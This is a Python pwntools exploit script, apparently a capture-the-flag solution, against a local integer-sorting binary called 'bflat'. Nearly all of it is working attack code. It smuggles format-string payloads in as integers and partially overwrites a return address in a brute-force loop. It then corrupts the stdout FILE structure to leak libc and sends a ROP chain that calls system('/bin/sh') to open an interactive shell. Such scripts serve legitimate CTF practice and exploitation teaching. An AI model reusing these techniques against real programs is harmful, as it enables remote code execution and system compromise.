from pwn import *
import ctypes
import time

#init

#e = ELF('/app/bflat')
#libc_path = e.libc.path 

e = ELF('../attachments/bflat')
libc_path = '../attachments/libc.so.6'

context.binary = e

libs_debug = libcdb.download_libraries(libc_path, unstrip = True)
libc = ELF(f'{libs_debug}/libc.so.6')

#funcs

def str2arr(s):
    return [u32(s[i:i+4].ljust(4, b'\x00')) for i in range(0, len(s), 4)]

def kek(a, x, b = True):
    if b:
        p.sendlineafter(b'How many ints?', str(len(a)).encode())
    p.sendlineafter(b'Input ints (separate by space):', ' '.join(list(map(str, a))).encode())
    p.sendlineafter(b'Input sort type (1 = forward, 2 = reverse):', str(x).encode())

def uwu():
    p.recvuntil(b'Sorted array:\n')
    return list(map(lambda x : ctypes.c_uint32(int(x)).value, p.recvline(keepends = False).split()))

def leak():
    s = b'    '
    s += b'%190$10c'
    s += b'%190$8mc'
    s += b'%185$33c'
    s += b'%1$30c'

    kek(str2arr(s), -7)

    p.send(b'a' * 0x8 + p16(0x5000 | ((e.sym['main'] + 67) & 0xfff)))
    p.send(b'b' * 0x8)
    p.send(p64(0xfbad1800) + p64(0x0) * 3 + p8(0x00))
    p.send(b'\x00' * 30)

    #after returning to main and outputting number ints libc adr pops out from puts

    p.sendline(b'2')

    p.recvline()
    return u64(p.recv(8)) - libc.sym['_IO_2_1_stdout_'] - 132

#exploit

#scanf overwrite 2 bytes main 1/16 chance and leak w/ _IO_2_1_stdout_ babycache

while not libc.address:
    #p = process(e.path)
    p = remote('localhost', 1337)
    
    try:
        libc.address = leak()
    except:
        p.close()

log.info('Libc adr: ' + hex(libc.address))

#run rop w/ scanf overwrite

rop = ROP(libc)
rop.call(rop.ret.address)
rop.system(next(libc.search(b'/bin/sh')))

log.info('Rop chain: \n' + rop.dump())

s = b'%162$s'
kek(str2arr(s), -7, False)

p.sendline(b'a' * 0x8 + rop.chain())

#pray for flag

p.interactive()
